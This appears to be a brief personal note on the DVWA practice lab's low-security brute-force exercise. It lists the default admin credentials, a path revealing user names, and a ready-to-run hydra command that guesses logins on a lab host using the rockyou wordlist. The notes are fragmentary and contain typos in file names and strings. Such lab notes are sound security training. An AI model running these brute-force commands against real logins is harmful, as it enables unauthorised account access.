# brute force

## low
- login user: admin, password: password
    - check photo
    - /dvwa/hackable/users
    - this have many user
    - add user in file
- hydra -L useer.txt -P rockyou.txt 10.0.2.5 http-get-form "/dvwa/vulnerabilities/brute?username=1&password=1&Login=Login#:Incorret"